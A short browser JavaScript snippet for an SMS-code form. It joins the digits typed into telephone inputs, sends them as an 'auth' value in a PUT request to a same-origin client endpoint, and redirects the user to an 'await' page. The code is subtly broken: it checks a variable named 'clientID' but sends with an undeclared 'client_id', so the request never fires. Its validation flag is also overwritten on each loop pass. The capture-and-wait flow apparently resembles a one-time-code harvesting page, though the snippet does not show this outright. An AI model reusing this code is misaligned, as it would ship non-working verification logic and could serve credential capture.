const sms = (() => {
    //private var/functions
    function send(selector) {
        const btn = document.querySelector(selector)

        if (!btn) return

        const form = btn.closest('form')
        const clientID = document.body.dataset.client

        if (!btn || !form || !clientID) return

        btn.addEventListener('click', async function (e) {
            e.preventDefault()

            const fields = form.querySelectorAll('input[type="tel"]')

            if (!fields) return

            let data = ``

            let validade = false

            for (const field of fields) {
                if (field.value) {
                    validade = true
                } else {
                    validade = false
                }
                data += field.value
            }

            if (!validade && data.length < 6) return

            try {
                const value = { auth: data }

                const config = {
                    method: `put`,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(value),
                }

                if (client_id) {
                    const client = await fetch(`/api/client/mail/${client_id}`, config)

                    const response = await client.json()

                    if (client.status === 200) return (window.location.href = `/await?client=${response.id}`)
                }
            } catch (error) {
                console.log(error)
            }
        })
    }

    return {
        //public var/functions
        send,
    }
})()

sms.send('.formMail__code .validate')
